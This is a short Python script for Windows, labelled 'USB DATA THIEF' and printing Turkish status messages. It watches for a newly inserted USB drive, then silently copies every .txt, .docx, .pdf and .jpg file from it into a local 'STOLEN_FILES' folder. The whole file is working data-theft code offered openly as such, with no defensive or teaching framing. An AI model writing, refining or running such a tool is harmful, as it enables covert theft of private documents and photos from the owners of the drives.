import os
import time
import shutil
import string
from ctypes import windll

print("--- USB DATA THIEF ---")

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1: drives.append(letter)
        bitmask >>= 1
    return drives

existing = get_drives()
print(f"[*] Bekleniyor... Mevcut: {existing}")

while True:
    current = get_drives()
    if len(current) > len(existing):
        new_drive = list(set(current) - set(existing))[0]
        print(f"[🔥] USB TAKILDI: {new_drive}:\\")
        
        target = "STOLEN_FILES"
        if not os.path.exists(target): os.makedirs(target)
        
        for root, dirs, files in os.walk(f"{new_drive}:\\"):
            for file in files:
                if file.endswith((".txt", ".docx", ".pdf", ".jpg")):
                    try:
                        shutil.copy(os.path.join(root, file), target)
                        print(f"   -> Çalındı: {file}")
                    except: pass
        break
    time.sleep(1)